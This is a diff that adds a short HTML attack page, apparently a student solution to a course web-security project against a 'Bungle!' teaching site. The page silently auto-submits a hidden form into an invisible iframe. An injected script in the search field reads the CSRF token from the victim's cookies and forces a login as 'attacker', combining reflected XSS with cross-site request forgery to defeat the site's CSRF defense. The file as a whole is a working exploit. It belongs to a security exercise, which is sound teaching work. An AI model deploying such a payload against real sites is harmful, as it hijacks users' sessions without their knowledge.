@@ -1,0 +1,16 @@
+<html>
+    <head>
+        <title>Bungle!</title>
+    </head>
+    <body>
+        <form name="getkey" method="get" action="http://ecen5032.org/project2/search" target="dummyframe">
+            <input name="csrfdefense" value="1" type="hidden">
+            <input name="xssdefense" value="0" type="hidden">
+            <input name="q" value="<script>key = '';arr = document.cookie.split(';');for(var i = 0; i < arr.length; i++){ if(arr[i].includes('csrf_token')){key = arr[i].split('=')[1];}};$.post('login', {username: 'attacker', password: 'l33th4x', csrf_token: key});</script>" type="hidden">
+        </form>
+        <iframe name="dummyframe" id="dummyframe" height="0" width="0" border="0" style="display: none;"></iframe>
+        <script>
+            document.getkey.submit();
+        </script>
+    </body>
+</html>
